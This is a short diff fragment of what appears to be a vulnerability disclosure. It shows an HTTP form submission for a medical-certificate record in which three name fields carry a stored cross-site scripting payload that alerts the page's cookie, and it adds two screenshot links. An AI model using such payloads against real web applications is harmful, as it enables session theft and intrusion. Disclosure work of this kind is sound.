@@ -35,8 +35,10 @@ Sec-Fetch-Site: same-origin
 id=1&lastname=%3Cimg+src%3D1+onerror%3Dalert(document.cookie)%3E&firstname=%3Cimg+src%3D1+onerror%3Dalert(document.cookie)%3E&middlename=%3Cimg+src%3D1+onerror%3Dalert(document.cookie)%3E&suffix=Jr.&dob=1997-06-23&gender=Male&civil_status=Married&contact=09123654789&nationality=Filipino&address=Sample+Address&diagnostic=Flu&remarks=is+advising+the+above+individual+should+take+at+least+3-4+days+to+fully+recover+from+his+illness.&doctor_fullname=Claire+Blake&doctor_suffix=MD
 
 ```
+<img width="1286" alt="image" src="https://github.com/user-attachments/assets/4c455e4d-7e32-4d89-9226-76bba059b363">
 
 
+<img width="1531" alt="image" src="https://github.com/user-attachments/assets/80764409-a22f-4766-b27d-a1ffc4298829">
 
 
 
